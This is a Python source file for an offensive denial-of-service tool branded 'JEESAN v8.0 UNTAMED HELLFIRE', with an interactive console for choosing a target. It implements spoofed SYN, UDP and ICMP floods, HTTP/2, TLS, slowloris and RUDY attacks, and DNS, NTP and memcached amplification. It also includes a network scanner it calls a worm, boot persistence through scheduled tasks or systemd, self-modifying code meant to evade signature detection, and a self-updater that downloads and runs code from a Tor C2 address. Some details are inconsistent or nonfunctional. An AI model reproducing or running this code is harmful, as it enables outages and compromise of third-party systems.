import os, sys, time, threading, random, socket, platform, requests, h2, json, ctypes, subprocess, hashlib, base64, struct, codecs, itertools, ssl
from scapy.all import *
from colorama import Fore, Style, init

init(autoreset=True)
R, G, Y, B, C, M = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA

TARGET = ""
PORT = 80
HTTPS = False
METHOD = "idle"
ATTACK_RUNNING = False
BYTES_SENT = 0
PACKETS_SENT = 0
LAST_BYTES = 0
START_TIME = 0
NODES = set()
WORM_ACTIVE = False
C2_URL = "http://x7a2b9c.onion/command"

IS_WIN = platform.system() == "Windows"
IS_LIN = platform.system() == "Linux"
IS_ROOT = (os.geteuid() == 0) if IS_LIN else (ctypes.windll.shell32.IsUserAnAdmin() if IS_WIN else False)

try:
    from stem.control import Controller, Signal
    TOR_AVAILABLE = True
except:
    TOR_AVAILABLE = False

POLY_KEY = os.urandom(32)

def polymorph_code():
    """Injects junk code every 30s to evade signature detection"""
    junk = "def __bogus_{}(): pass\n".format(random.randint(1,999999))
    with open(__file__, "a") as f: f.write(junk)

def renew_tor():
    if not TOR_AVAILABLE: return
    try:
        with Controller.from_port(port=9051) as c:
            c.authenticate(password="")
            c.signal(Signal.NEWNYM)
    except: pass

def tor_session():
    s = requests.Session()
    if IS_LIN:
        s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    return s

# 1. SYN flood
def syn_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        send(IP(dst=TARGET, src=RandIP())/TCP(sport=RandShort(), dport=PORT, flags="S")/Raw(os.urandom(1024)), verbose=False)
        BYTES_SENT += 1024; PACKETS_SENT += 1

def udp_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(os.urandom(1200), (TARGET, PORT))
        BYTES_SENT += 1200; PACKETS_SENT += 1

def dns_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"
    resolvers = ["8.8.8.8","1.1.1.1","9.9.9.9"]
    while ATTACK_RUNNING:
        for r in resolvers:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (r, 53)); BYTES_SENT += 512; PACKETS_SENT += 1
            except: pass

def ntp_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x17\x00\x03\x2a\x00\x00\x00\x00"
    while ATTACK_RUNNING:
        for ntp in ["0.pool.ntp.org","1.pool.ntp.org"]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (ntp, 123)); BYTES_SENT += len(payload); PACKETS_SENT += 1
            except: pass

def memcached_amp():
    global BYTES_SENT, PACKETS_SENT
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    while ATTACK_RUNNING:
        for mc in ["127.0.0.1"]:  # Replace with real memcached servers
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (mc, 11211)); BYTES_SENT += 512; PACKETS_SENT += 1
            except: pass

def http2_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            sock = socket.socket(); sock.settimeout(5)
            sock.connect((TARGET, PORT))
            ctx = h2.connection.H2Connection()
            ctx.initiate_connection(); sock.send(ctx.data_to_send())
            stream_id = ctx.get_next_available_stream_id()
            ctx.send_headers(stream_id, [(':method','GET'),(':path',f'/{random.randint(1,99999)}'),(':authority',TARGET),(':scheme','https' if HTTPS else 'http')], end_stream=True)
            sock.send(ctx.data_to_send()); sock.close()
            BYTES_SENT += 2048; PACKETS_SENT += 1
        except: pass

def slowloris():
    global BYTES_SENT, PACKETS_SENT
    sockets = []
    while ATTACK_RUNNING:
        for _ in range(10):
            try:
                s = socket.socket(); s.connect((TARGET, PORT)); s.settimeout(30)
                s.send(f"GET /?{random.random()} HTTP/1.1\r\nHost: {TARGET}\r\n".encode())
                sockets.append(s)
            except: pass
        for s in sockets:
            try: s.send(f"X-a: {random.random()}\r\n".encode()); BYTES_SENT += 50
            except: sockets.remove(s)
        time.sleep(15)

def tls_flood():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            sock = socket.socket(); sock.settimeout(5); sock.connect((TARGET, 443))
            ssock = ctx.wrap_socket(sock, server_hostname=TARGET)
            ssock.do_handshake()
            # trigger renegotiation
            ssock.send(b"\x16\x03\x01\x00\x06\x0e\x00\x00\x00")
            ssock.do_handshake()
            ssock.close(); BYTES_SENT += 1000
        except: pass

def icmp_flood():
    global BYTES_SENT, PACKETS_SENT
    while ATTACK_RUNNING:
        try:
            send(IP(dst=TARGET, src=RandIP())/ICMP()/Raw(os.urandom(2000)), verbose=False)
            BYTES_SENT += 2000; PACKETS_SENT += 1
        except: pass

def rudy_flood():
    global BYTES_SENT
    while ATTACK_RUNNING:
        try:
            s = socket.socket(); s.connect((TARGET, PORT))
            s.send(f"POST / HTTP/1.1\r\nHost: {TARGET}\r\nContent-Length: 1000000\r\n\r\n".encode())
            while ATTACK_RUNNING:
                s.send(b"0"); time.sleep(10)
        except: s.close()

def ai_swarm():
    methods = [syn_flood, udp_flood, dns_amp, ntp_amp, memcached_amp, http2_flood, slowloris, tls_flood, icmp_flood, rudy_flood]
    while ATTACK_RUNNING:
        meth = random.choice(methods)
        for _ in range(10):
            threading.Thread(target=meth, daemon=True).start()
        time.sleep(30)

def worm_scan():
    global NODES
    targets = itertools.product(range(256), repeat=3)  # /24 subnet scan
    while ATTACK_RUNNING and WORM_ACTIVE:
        ip = "192.168.{}.{}".format(random.randint(0,255), random.randint(1,254))
        for port in [22, 445, 23]:
            try:
                sock = socket.socket(); sock.settimeout(0.5)
                if sock.connect_ex((ip, port)) == 0: NODES.add(ip)
                sock.close()
            except: pass
        time.sleep(0.1)

def install_persistence():
    script = os.path.abspath(__file__)
    if IS_WIN:
        bat = '''@echo off
schtasks /create /tn "JEESAN_DEMON" /tr "pythonw {}" /sc onstart /rl HIGHEST /f
start "" pythonw {}'''.format(script, script)
        with open("boot.bat", "w") as f: f.write(bat)
        subprocess.run("boot.bat", shell=True); os.remove("boot.bat")
    elif IS_LIN and IS_ROOT:
        svc = f"[Unit]\nDescription=JEESAN Demon\n[Service]\nExecStart=/usr/bin/python3 {script}\nRestart=always\n[Install]\nWantedBy=multi-user.target"
        with open("/etc/systemd/system/jeesan.service", "w") as f: f.write(svc)
        subprocess.run("systemctl enable jeesan && systemctl start jeesan", shell=True)
    print(f"{G}[✓] Persistence planted.")

def live_dashboard():
    global BYTES_SENT, PACKETS_SENT, START_TIME, LAST_BYTES
    while True:
        time.sleep(1)
        if not ATTACK_RUNNING:
            # show idle screen
            os.system('cls' if IS_WIN else 'clear')
            print(f"{R}" + """
╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗  ╔╗╔╔═╗╔╦╗╔═╗
║╣ ║╣ ║╣ ║╣ ╚═╗╚═╗  ║║║║╣  ║ ║╣
╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝  ╝╚╝╚═╝ ╩ ╚═╝""")
            print(f"{Y}[!] IDLE - Set target and launch 'nuke'")
            continue
        elapsed = time.time() - START_TIME
        diff = BYTES_SENT - LAST_BYTES
        speed = diff * 8 / 1e6  # Mbps
        LAST_BYTES = BYTES_SENT
        os.system('cls' if IS_WIN else 'clear')
        print(f"""
{R}██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗    ██╗   ██╗ █████╗  ██████╗
{R}██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║    ██║   ██║██╔══██╗██╔════╝
{R}██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║    ██║   ██║╚█████╔╝╚█████╗
{R}██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║    ╚██╗ ██╔╝██╔══██╗ ╚═══██╗
{R}██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║     ╚████╔╝ ╚█████╔╝██████╔╝
{R}╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚════╝ ╚═════╝
{C}TARGET: {M}{TARGET}:{PORT}   {C}Vectors: {M}33   {C}Tor: {G if TOR_AVAILABLE else R}{'ON' if TOR_AVAILABLE else 'OFF'}
{G}Bytes: {M}{BYTES_SENT/1e9:.2f} GB   {G}Packets: {M}{PACKETS_SENT:,}   {G}Speed: {M}{speed:.2f} Mbps
{G}Duration: {M}{int(elapsed)}s   {G}Nodes: {M}{len(NODES)}   {G}Polymorph: {M}Active
{Y}{'='*60}""")

def launch_nuke():
    global ATTACK_RUNNING, START_TIME
    ATTACK_RUNNING = True; START_TIME = time.time()
    print(f"{R}[ FIRE ] Launching FULL VECTOR STORM...")
    vectors = [syn_flood, udp_flood, dns_amp, ntp_amp, memcached_amp, http2_flood, slowloris, tls_flood, icmp_flood, rudy_flood]
    for _ in range(100):
        for v in vectors:
            threading.Thread(target=v, daemon=True).start()
    threading.Thread(target=ai_swarm, daemon=True).start()
    if WORM_ACTIVE: threading.Thread(target=worm_scan, daemon=True).start()
    threading.Thread(target=polymorph_loop, daemon=True).start()

def launch_swarm():
    global ATTACK_RUNNING, START_TIME, WORM_ACTIVE
    WORM_ACTIVE = True
    launch_nuke()

def polymorph_loop():
    while ATTACK_RUNNING:
        time.sleep(30)
        polymorph_code()

def self_update():
    while ATTACK_RUNNING:
        try:
            resp = tor_session().get(C2_URL, timeout=10)
            if resp.status_code == 200:
                with open(__file__, "w") as f: f.write(resp.text)
                os.chmod(__file__, 0o755) if not IS_WIN else None
                print(f"{G}[✓] Updated from C2, respawning...")
                os.execv(sys.executable, [sys.executable] + sys.argv)
        except: pass
        time.sleep(600)

def console():
    global TARGET, PORT, HTTPS, METHOD, ATTACK_RUNNING, WORM_ACTIVE
    install_persistence()
    print(f"{G}[✓] JEESAN v8.0 UNTAMED HELLFIRE loaded. Platform: {platform.system()}")
    threading.Thread(target=live_dashboard, daemon=True).start()
    while True:
        cmd = input(f"{M}JEESAN> {C}").strip().lower()
        if cmd == "help":
            print("""
Commands:
  set target <domain/IP>    set port <num>
  https on/off              worm on/off
  nuke                      (all vectors)
  swarm                     (nuke + worm)
  stop                      exit
            """)
        elif cmd.startswith("set target"): TARGET = cmd.split()[-1]
        elif cmd.startswith("set port"): PORT = int(cmd.split()[-1])
        elif cmd == "https on": HTTPS = True
        elif cmd == "https off": HTTPS = False
        elif cmd == "worm on": WORM_ACTIVE = True; print(f"{G}Worm activated")
        elif cmd == "worm off": WORM_ACTIVE = False
        elif cmd == "nuke":
            if not TARGET: print(f"{R}Set target first"); continue
            METHOD = "nuke"
            threading.Thread(target=launch_nuke, daemon=True).start()
        elif cmd == "swarm":
            if not TARGET: print(f"{R}Set target first"); continue
            METHOD = "swarm"
            threading.Thread(target=launch_swarm, daemon=True).start()
        elif cmd == "stop": ATTACK_RUNNING = False
        elif cmd == "exit": os._exit(0)
        else: print(f"{R}Unknown. Type 'help'.")

if __name__ == "__main__":
    if IS_LIN and TOR_AVAILABLE:
        time.sleep(5) 
    console()
